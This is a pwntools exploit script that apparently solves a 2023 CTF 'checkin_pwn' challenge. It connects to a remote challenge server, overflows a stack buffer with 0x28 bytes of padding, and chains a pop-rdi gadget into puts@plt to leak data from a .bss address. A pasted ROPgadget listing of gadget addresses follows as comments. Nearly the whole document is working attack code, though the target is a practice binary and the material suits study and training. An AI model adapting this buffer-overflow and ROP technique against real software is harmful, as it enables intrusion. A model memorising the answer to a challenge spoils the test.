from pwn import *
context(log_level='debug',arch='amd64',os='linux',terminal=['tmux','splitw','-h'])


# io=process("./[HZNUCTF 2023 preliminary]checkin_pwn")
io=remote("43.143.7.97",28127)
elf=ELF("./[HZNUCTF 2023 preliminary]checkin_pwn")

io.recvuntil(b"checkin\n")
bss_addr=0x4040C0
pop_rdi_ret=0x401483
payload=b"a"*0x28+p64(pop_rdi_ret)+p64(bss_addr)+p64(elf.plt[b"puts"])+b"a"*(0xf00)
io.sendline(payload)

io.interactive()
# Gadgets information
# ============================================================
# 0x000000000040147c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040147e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401480 : pop r14 ; pop r15 ; ret
# 0x0000000000401482 : pop r15 ; ret
# 0x000000000040147b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040147f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040121d : pop rbp ; ret
# 0x0000000000401483 : pop rdi ; ret
# 0x0000000000401481 : pop rsi ; pop r15 ; ret
# 0x000000000040147d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret

# Unique gadgets found: 11
